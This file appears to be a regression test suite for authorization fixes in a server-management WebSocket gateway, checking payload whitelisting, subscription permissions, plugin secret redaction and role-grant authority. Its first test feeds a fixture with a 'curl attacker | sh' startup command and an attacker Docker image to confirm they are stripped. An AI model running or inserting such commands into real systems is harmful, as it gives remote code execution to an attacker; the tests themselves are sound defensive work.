/**
 * Regression tests for the second-wave authorization fixes (2026-09 audit).
 *
 * Covers:
 * 1. server_control WS forwarding: client-supplied template/image/startup
 *    fields must NOT reach the agent (whitelist only).
 * 2. Gateway subscribe: bare node assignment (without node.update) must not
 *    grant console/server read of every server on the node.
 * 3. Plugin config redaction: password-typed runtime values are stripped for
 *    non-admin callers; the detail/frontend-manifest endpoints stay usable
 *    for non-admins (redaction, not 403).
 * 4. Roles: assignment requires authority over the role's scoped grants.
 */
import { describe, it, expect } from "vitest";
import { WebSocketGateway } from "../websocket/gateway.js";

const loggerStub: any = {
  child: () => loggerStub,
  info: () => {},
  warn: () => {},
  error: () => {},
  debug: () => {},
};

function makeClientSocket() {
  const sent: any[] = [];
  return {
    readyState: 1,
    sent,
    on: () => {},
    once: () => {},
    off: () => {},
    send: (data: any) => sent.push(data),
    close: () => {},
    terminate: () => {},
    ping: () => {},
  };
}

function makePrismaStub(): any {
  return {
    systemSetting: { findUnique: async () => null },
    node: { findUnique: async () => null, update: async () => ({}) },
    server: {
      findUnique: async () => ({
        id: "s1",
        uuid: "u1",
        nodeId: "n1",
        ownerId: "owner",
        suspendedAt: null,
      }),
      findMany: async () => [],
    },
    serverAccess: { findUnique: async () => null },
    nodeAssignment: { findFirst: async () => null, findMany: async () => [] },
    role: { findMany: async () => [] },
  };
}

describe("WS server_control payload whitelist", () => {
  it("strips client-supplied image/startup fields before forwarding to the agent", async () => {
    const prisma: any = makePrismaStub();
    // Sub-user with only server.stop — enough to authorize a restart.
    prisma.serverAccess.findUnique = async () => ({
      permissions: ["server.stop"],
    });
    const gw: any = new WebSocketGateway(prisma, loggerStub);
    const agentReceived: any[] = [];
    const agentSocket = makeClientSocket();
    (agentSocket as any).send = (d: any) => agentReceived.push(d);
    gw.agents.set("n1", {
      nodeId: "n1",
      socket: agentSocket,
      authenticated: true,
      lastHeartbeat: Date.now(),
    });
    const client = {
      userId: "subuser",
      socket: makeClientSocket(),
      authenticated: true,
      subscriptions: new Set<string>(),
    };
    gw.clients.set("c1", client);

    await gw.handleClientMessage(
      "c1",
      JSON.stringify({
        type: "server_control",
        serverId: "s1",
        action: "restart",
        startupCommand: "curl attacker | sh",
        dockerImage: "attacker/image:latest",
        image: "attacker/image:latest",
        template: {
          startup: "curl attacker | sh",
          image: "attacker/image:latest",
          stopCommand: "/bin/sh -c 'graceful stop'",
        },
        environment: { EVIL: "yes" },
      }),
    );

    expect(agentReceived.length).toBe(1);
    const forwarded = JSON.parse(agentReceived[0]);
    expect(forwarded.type).toBe("server_control");
    expect(forwarded.action).toBe("restart");
    expect(forwarded.serverUuid).toBe("u1");
    // Dangerous client-controlled fields must not survive forwarding:
    expect(forwarded.startupCommand).toBeUndefined();
    expect(forwarded.dockerImage).toBeUndefined();
    expect(forwarded.image).toBeUndefined();
    expect(forwarded.environment).toBeUndefined();
    expect(forwarded.template?.startup).toBeUndefined();
    expect(forwarded.template?.image).toBeUndefined();
    // The benign graceful-stop policy is preserved (parse_stop_policy input):
    expect(forwarded.template?.stopCommand).toBe("/bin/sh -c 'graceful stop'");
    gw.destroy();
  });

  it("whitelists exactly the intended keys for a plain power action", async () => {
    const prisma: any = makePrismaStub();
    prisma.serverAccess.findUnique = async () => ({
      permissions: ["server.stop"],
    });
    const gw: any = new WebSocketGateway(prisma, loggerStub);
    const agentReceived: any[] = [];
    const agentSocket = makeClientSocket();
    (agentSocket as any).send = (d: any) => agentReceived.push(d);
    gw.agents.set("n1", {
      nodeId: "n1",
      socket: agentSocket,
      authenticated: true,
      lastHeartbeat: Date.now(),
    });
    const client = {
      userId: "subuser",
      socket: makeClientSocket(),
      authenticated: true,
      subscriptions: new Set<string>(),
    };
    gw.clients.set("c2", client);

    await gw.handleClientMessage(
      "c2",
      JSON.stringify({
        type: "server_control",
        serverId: "s1",
        action: "stop",
        injectedArbitrary: { nested: "payload" },
      }),
    );

    const forwarded = JSON.parse(agentReceived[0]);
    expect(Object.keys(forwarded).sort()).toEqual(
      ["action", "serverId", "serverUuid", "suspended", "type"],
    );
    gw.destroy();
  });
});

describe("WS subscribe authorization (bare node grant)", () => {
  it("denies subscribe for a bare node assignment without node.update", async () => {
    const prisma: any = makePrismaStub();
    const gw: any = new WebSocketGateway(prisma, loggerStub);
    const client = {
      userId: "nodeuser",
      socket: makeClientSocket(),
      authenticated: true,
      subscriptions: new Set<string>(),
    };
    gw.clients.set("c3", client);

    await gw.handleClientMessage(
      "c3",
      JSON.stringify({ type: "subscribe", serverId: "s1" }),
    );

    const errors = client.socket.sent
      .map((d: any) => JSON.parse(d))
      .filter((m: any) => m.type === "error");
    expect(errors.some((e: any) => e.error === "PERMISSION_DENIED")).toBe(true);
    expect(client.subscriptions.has("s1")).toBe(false);
    gw.destroy();
  });

  it("allows subscribe when node assignment is paired with node.update", async () => {
    const prisma: any = makePrismaStub();
    const gw: any = new WebSocketGateway(prisma, loggerStub);
    // Resolve the server-scoped permission set the same way the production
    // code does (node assignment + node.update pairing).
    (gw as any).getUserServerRolePermissions = async () => [
      "node.update",
      "server.read",
    ];
    (gw as any).requestConsoleStream = async () => {};
    (gw as any).sendToAgent = async () => true;
    const client = {
      userId: "nodemanager",
      socket: makeClientSocket(),
      authenticated: true,
      subscriptions: new Set<string>(),
    };
    gw.clients.set("c4", client);

    await gw.handleClientMessage(
      "c4",
      JSON.stringify({ type: "subscribe", serverId: "s1" }),
    );

    expect(client.subscriptions.has("s1")).toBe(true);
    gw.destroy();
  });
});

describe("plugin config redaction (static contract)", () => {
  it("detail/frontend-manifest redact instead of blocking non-admins", async () => {
    const fs = await import("fs");
    const src = await fs.promises.readFile(
      new URL("../routes/plugins.ts", import.meta.url),
      "utf8",
    );
    expect(src).toContain("redactPluginConfigForNonAdmin");
    expect(src).toContain("type === 'password'");
    expect(src).toContain("return {};");
    // ensureAdmin must NOT be used in the config ternaries (it 403s regular
    // users and breaks plugin UIs); the pure predicate is used instead.
    expect(src).toContain("isAdminCaller");
    expect(src).not.toMatch(/config:\s*ensureAdmin/);
  });
});

describe("role assignment scoped-grant authority (static contract)", () => {
  it("assignment validates RoleServerGrant/RoleNodeGrant permissions", async () => {
    const fs = await import("fs");
    const src = await fs.promises.readFile(
      new URL("../routes/roles.ts", import.meta.url),
      "utf8",
    );
    expect(src).toContain("roleServerGrant.findMany");
    expect(src).toContain("roleNodeGrant.findMany");
    expect(src).toContain("scoped permissions you don't have");
  });
});

describe("node agent-key minting requires node-manage path (static contract)", () => {
  it("deployment-token and api-key routes check hasNodeAccess + node.update", async () => {
    const fs = await import("fs");
    const src = await fs.promises.readFile(
      new URL("../routes/nodes.ts", import.meta.url),
      "utf8",
    );
    const deployIdx = src.indexOf("deployment flow provisions an agent API key");
    const apiKeyIdx = src.indexOf("minting an agent API key makes the caller");
    expect(deployIdx).toBeGreaterThan(-1);
    expect(apiKeyIdx).toBeGreaterThan(-1);
    // Both mint routes must pair hasNodeAccess with node.update.
    expect(src).toContain('rolePerms.includes("node.update")');
  });
});
